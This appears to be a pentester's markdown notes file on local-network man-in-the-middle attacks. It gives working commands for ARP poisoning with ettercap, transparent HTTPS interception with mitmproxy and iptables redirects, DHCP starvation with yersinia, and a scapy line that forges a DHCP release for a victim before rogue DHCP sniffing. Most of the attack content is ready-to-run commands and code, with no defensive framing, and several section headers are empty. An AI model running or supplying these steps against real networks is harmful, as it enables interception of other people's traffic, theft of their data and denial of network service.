
# MITM 
In case of a wired network, we should use a Hub to connect on network. 
This attack is based on a faster answer to DHCPRequest than DHCP server from targeted network. If the server is answering before us a DOS on it could resolve the problem.
More informations here: [https://www.whitewinterwolf.com/posts/2017/10/30/dhcp-exploitation-guide/]()


## Host scan
Find host on network: 
	
	nmap -sn 192.168.1.0/24
	Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-22 15:01 CET
	Nmap scan report for box (192.168.1.1)
	Host is up (0.018s latency).
	MAC Address: E4:5D:51:CA:6B:18 (SFR)
	Nmap scan report for MBP-de-Florent (192.168.1.38)
	Host is up (0.13s latency).
	MAC Address: F4:0F:24:1A:3F:84 (Apple)
	Nmap scan report for HPA58000 (192.168.1.40)
	Host is up (0.26s latency).
	MAC Address: 30:E1:71:A5:80:00 (Hewlett Packard)
	Nmap scan report for SoundTouch-20 (192.168.1.56)
	Host is up (0.25s latency).
	MAC Address: 88:4A:EA:7E:FA:49 (Texas Instruments)
	Nmap scan report for 192.168.1.78
	Host is up (0.23s latency).
	MAC Address: B0:C0:90:DA:2C:52 (Chicony Electronics)
	Nmap scan report for FNN-LAPTOP (192.168.1.90)
	Host is up (0.054s latency).
	MAC Address: E4:70:B8:D7:48:DF (Intel Corporate)
	Nmap scan report for kali (192.168.1.25)
	Host is up.
	Nmap done: 256 IP addresses (7 hosts up) scanned in 3.65 seconds

## Ettercap - ARP Poisoning
- Activate ip_forward
	
	sysctl -w net.ipv4.ip_forward=1

- Launch ettercap (not from root)

	ettercap -G

- define Target from menu Target > Select Target:

	HOST1 = Cible
	HOST2 = Routeur (ie:192.168.1.1)

- launch arppoisoning by clicking Start/Stop ARP Poisoning
- Follow connections 

## Bettercap 


## HSTS - HTTP to HTTPS exploit with sslstrip
https://jlajara.gitlab.io/posts/2019/11/11/HSTS.html



## Mitmproxy (sslsplit equivalent)
This solution will not be discret unless you setup the mitm.it ssl certificate on target device. 
Once certificate is installed the target device connection will appear as secure.

- Activate ip forward
	sysctl -w net.ipv4.ip_forward=1
- launch mitmproxy
	mitmproxy -m transparent -k
- Mitm proxy use port 8080 to receive request. Though, you should redirect 443 and 80.
	iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080
	iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
- Navigate to mitm.it with the target device


## DNSchef - DNS Poisoning



## DOS (Denial of Service)
- Flood DHCP server to make sure, it will note answer:
	yersinia dhcp -interface wlan0 -attack 1	

	Dynamic Host Configuration Protocol (DHCP):
       -source hw_addr
              Source MAC address
       -dest hw_addr
              Destination MAC address
       -interface iface
              Set network interface to use
       -attack attack
              Attack to launch

	Attacks Implemented in DHCP:
	0: NONDOS attack sending RAW packet
	1: DOS attack sending DISCOVER packet
	2: NONDOS attack creating DHCP rogue server
	3: DOS attack sending RELEASE packet



----------------------------------------------------------------------------------


## Force DHCP Release

- Force release with scapy:
	Client : 192.168.1.97 08:C5:E1:89:31:BC
	Server : 192.168.1.1 E4:5D:51:CA:6B:18

sendp(Ether(src="08:C5:E1:89:31:BC",dst="E4:5D:51:CA:6B:18") /
IP(src="192.168.1.97",dst="192.168.1.1") /
UDP(sport=68,dport=67) /
BOOTP(chaddr="\x08\xC5\xE1\x89\x31\xBC",ciaddr="192.168.1.97",xid=random.randint(0, 0xFFFFFFFF)) /
DHCP(options=[("message-type","release"),("server_id", "192.168.1.1"),"end"]), iface="wlan0") 


- Sniff remote connection :
	ettercap -Tzq -M dhcp:/255.255.255.0/192.168.1.1 -i wlan0





